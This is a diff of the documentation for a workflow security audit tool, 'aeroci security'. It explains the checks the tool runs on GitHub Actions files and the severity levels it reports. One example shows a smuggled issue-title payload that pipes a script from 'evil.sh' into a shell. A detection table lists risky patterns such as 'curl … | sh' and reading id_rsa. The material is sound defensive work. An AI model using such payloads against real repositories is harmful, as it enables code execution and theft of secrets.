@@ -1,147 +1,180 @@
-# Security Hardening Engine
-
-> **`aeroci security`** — Features 21–30
-
-The Security Hardening Engine performs automated security audits on GitHub Actions workflows to detect vulnerabilities, supply chain risks, script injection vectors, and permission misconfigurations.
-
----
-
-## Usage
+# Security audit
 
 ```bash
-aeroci security                            # audit all workflows
-aeroci security .github/workflows/ci.yml  # audit specific workflow
-aeroci security --report                   # generate security-report.md
-aeroci check --security                    # include in pre-flight check
+aeroci security                          # every workflow in the project
+aeroci security .github/workflows/ci.yml # one file
+aeroci security --json                   # machine-readable
+aeroci security --report                 # write security-report.md
+aeroci check --security                  # as part of the pre-flight check
 ```
+
+It reads the YAML and reports what it finds. Nothing is executed and no
+network call is made.
 
 ---
 
-## Feature 21 — Supply Chain Attack Detector (`SEC-021`)
+## Severity
 
-Flags actions that are not pinned to a full 40-character commit SHA.
+| Level | Meaning |
+|-------|---------|
+| **critical** | Exploitable as written. Fix before merging. |
+| **high** | A real risk that depends on context. Understand it before deciding. |
+| **medium** | A bad habit with a plausible incident. |
+| **low** | Worth knowing, rarely urgent. |
+| **info** | Context. |
 
-```yaml
-# ❌ Risky: Mutable version tags can be overwritten if an action repo is compromised
-- uses: third-party/action@v1
-
-# ✅ Secure: Immutable SHA pinning
-- uses: third-party/action@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
-```
-
-> **Note:** Trusted official GitHub actions (`actions/*`) at version tags are granted low severity.
-
----
-
-## Feature 22 — GITHUB_TOKEN Permission Auditor (`SEC-022`)
-
-Audits workflow and job-level permissions to prevent overly-broad access tokens.
-
-- **CRITICAL:** `permissions: write-all`
-- **MEDIUM:** Unnecessary `write` permissions on sensitive scopes (e.g. `packages: write`, `contents: write`)
-
-```yaml
-# ❌ Dangerous
-permissions: write-all
-
-# ✅ Principle of least privilege
-permissions:
-  contents: read
-  pull-requests: write
-```
+`--json` gives the same findings with a stable shape, so you can gate on a
+level in CI. A workflow with no critical findings is not a workflow with no
+findings.
 
 ---
 
-## Feature 23 — Environment Injection Guard (`SEC-023`)
+## What it looks for
 
-Scans for `env.VAR` expressions interpolated directly inside `run:` shell blocks.
+### Template injection into a shell — critical
 
-```yaml
-# ❌ Vulnerable to shell injection if env comes from untrusted sources
-- run: echo "Hello ${{ 'env.USER_NAME' }}"
-
-# ✅ Secure: Pass as process environment variable
-- run: echo "Hello $USER_NAME"
-  env:
-    USER_NAME: ${{ 'env.USER_NAME' }}
-```
-
----
-
-## Feature 24 — Script Injection Scanner (`SEC-024`)
-
-Detects direct interpolation of user-controlled GitHub context values into `run:` scripts.
-
-**Monitored untrusted inputs:**
-- `github.event.issue.title`
-- `github.event.issue.body`
-- `github.event.pull_request.title`
-- `github.event.pull_request.body`
-- `github.event.comment.body`
-- `github.event.head_commit.message`
-- `github.actor`
-- `github.head_ref`
+A `run:` block that interpolates an expression a user controls. The
+expression is substituted into the script text *before* the shell sees it, so
+the value becomes shell syntax, not a string:
 
 ```yaml
-# ❌ CRITICAL: Shell Injection vulnerability
-- run: echo "Title: ${{ 'github.event.issue.title' }}"
+# ❌ the issue title is executed as shell
+- run: echo "Title: ${{ github.event.issue.title }}"
 
-# ✅ Secure
+# ✅ the value reaches the step as data
 - run: echo "Title: $TITLE"
   env:
-    TITLE: ${{ 'github.event.issue.title' }}
+    TITLE: ${{ github.event.issue.title }}
 ```
 
----
+An attacker who opens an issue titled `"; curl evil.sh | sh; #` gets that
+command run with the workflow's token.
 
-## Feature 25 — Secrets in Env Block Checker (`SEC-025`)
+The untrusted inputs it watches: issue and PR titles and bodies, comment
+bodies, `head_commit.message`, `github.actor`, `github.head_ref`, and the
+review and page fields.
 
-Scans `env:` blocks for hardcoded secret patterns (tokens, API keys, private keys) that should be moved to GitHub Secrets.
+The same check covers expressions reaching an `if:` condition, where the
+substitution changes which branch runs.
 
----
-
-## Feature 26 — pull_request_target Poison Detector (`SEC-026`)
-
-Detects dangerous combinations of `pull_request_target` triggers combined with checking out untrusted PR head code.
+### `pull_request_target` with a checkout of the PR head — critical
 
 ```yaml
-# ❌ High Risk: Executing untrusted PR code in write-privileged target context
-on: pull_request_target
+on: pull_request_target       # runs with the base repo's token and secrets
 jobs:
   build:
     steps:
       - uses: actions/checkout@v4
         with:
-          ref: ${{ 'github.event.pull_request.head.sha' }}
+          ref: ${{ github.event.pull_request.head.sha }}   # …the fork's code
 ```
 
+`pull_request_target` runs in the context of the base repository, with write
+access and every secret. Checking out the PR head then executes the fork's
+code with all of it. Anyone who can open a PR can use it.
+
+### A hardcoded credential in the file — critical
+
+Patterns for AWS keys (`AKIA…`, `ASIA…`), GitHub tokens (`ghp_`, `gho_`,
+`ghs_`, `ghu_`, `ghs_`, fine-grained `github_pat_`), Slack, Google, GitLab and
+npm tokens, private key blocks, JWTs and OpenAI-style keys.
+
+Each finding says what to rotate, because a key that reached git is
+compromised whether or not the workflow ever ran:
+
+```
+✖ a GitHub token is written in .github/workflows/ci.yml
+  ↳ revoke it at github.com/settings/tokens
+```
+
+### Action pinning — high
+
+```yaml
+- uses: third-party/action@v1        # high: a tag can be repointed
+- uses: third-party/action@main       # high: a branch moves continuously
+- uses: third-party/action@v1.2.3     # still high
+- uses: third-party/action@a1b2c3d4…   # ok: immutable
+```
+
+Only a full 40-character SHA is immutable. A short SHA is not: a prefix is
+not a unique identifier, so two commits can share it.
+
+Actions under `actions/*` at a version tag are reported at a lower severity,
+since the blast radius of a compromised official action is smaller.
+
+An action with **no version at all** (`uses: owner/repo`) is also high — it
+tracks whatever the default branch has today.
+
+### Token permissions — high
+
+```yaml
+permissions: write-all     # high
+```
+
+and, at medium, `write` on a scope the job does not need. The default
+`GITHUB_TOKEN` is over-broad for most workflows, and
+`permissions: { contents: read }` costs nothing to add.
+
+### Exfiltration paths — high
+
+A secret that flows somewhere a step outside the job can see it: into a
+`run:` script, into an `if:` condition, or into a job that a
+`workflow_run` / `issue_comment` trigger then re-runs with more access.
+
+### `id-token: write` — high
+
+OIDC is how a workflow gets cloud credentials, so an unnecessary one is worth
+removing. Reported at the workflow level when no job needs it, and at the job
+level so you can see which one asked.
+
+### Untrusted input in a trigger context — critical / high
+
+`issue_comment`, `workflow_run` and `pull_request_target` can be triggered by
+anyone who can comment or open a PR. An action in that context, or a checkout
+of untrusted code, is the combination above in a different trigger.
+
+### Patterns in scripts — medium and low
+
+| Pattern | Level | Why |
+|---------|-------|-----|
+| `curl … \| sh` | high | The script is executed without being read. |
+| `eval "…"` | medium | Executes whatever the string contains. |
+| `npm install --force` / `--unsafe-perm` | medium | Lifecycle scripts run with the permissions they ask for. |
+| `git push --force` (without `--force-with-lease`) | medium | A concurrent push is silently discarded. |
+| `chmod 777` | medium | World-writable. |
+| `set -x` | low | Traces commands, so a secret in one is echoed. |
+| `cat .env`, `cat …id_rsa` | low | The value reaches the log unless it is masked. |
+
 ---
 
-## Feature 27 — Self-Hosted Runner Risk Scorer (`SEC-027`)
+## On self-hosted runners and dependency confusion
 
-Flags sensitive cloud deployments or publish operations executing on persistent `self-hosted` runners, where runner state could be compromised across PR runs.
+Older versions of this page advertised a "self-hosted runner risk scorer" and
+a "dependency confusion guard". Neither exists, and neither should be faked.
 
----
+The self-hosted case is a real risk, but deciding it needs knowledge the audit
+does not have: whether your runner is single-tenant, whether it is ephemeral,
+and what else lands on it. A rule that fired on every `runs-on: self-hosted`
+would be noise you learn to ignore.
 
-## Feature 28 — OIDC Token Scope Checker (`SEC-028`)
+Dependency confusion is a property of your registry configuration, not of a
+workflow file. What a workflow can show is a scoped install without a lockfile
+— worth reading, not worth a severity.
 
-Audits OpenID Connect (OIDC) `id-token: write` scope usage:
-- Warns if `id-token: write` is enabled at workflow level without being used.
-- Validates job-level scoping of OIDC permissions.
-
----
-
-## Feature 29 — Dependency Confusion Guard (`SEC-029`)
-
-Scans shell steps for ad-hoc package manager installations of scoped packages without lockfiles or offline flags, which may be susceptible to dependency confusion hijacking.
+If either becomes a real check, it goes in with a real rule behind it.
 
 ---
 
-## Feature 30 — Security Report Generator (`SEC-030`)
+## Reports
 
-When run with `--report`, generates a detailed Markdown audit report at `security-report.md` summarizing all findings categorized by severity:
-- `CRITICAL`
-- `HIGH`
-- `MEDIUM`
-- `LOW`
-- `INFO`
+`--report` writes a markdown file with every finding, grouped by severity and
+annotated with its location:
+
+```bash
+aeroci security --report                 # security-report.md
+aeroci security --report audit.md        # somewhere else
+aeroci security --json > findings.json   # for a CI gate
+```
+
+Findings are de-duplicated across jobs: a missing `timeout-minutes` in four
+jobs is one finding that says four, not four findings to scroll past.
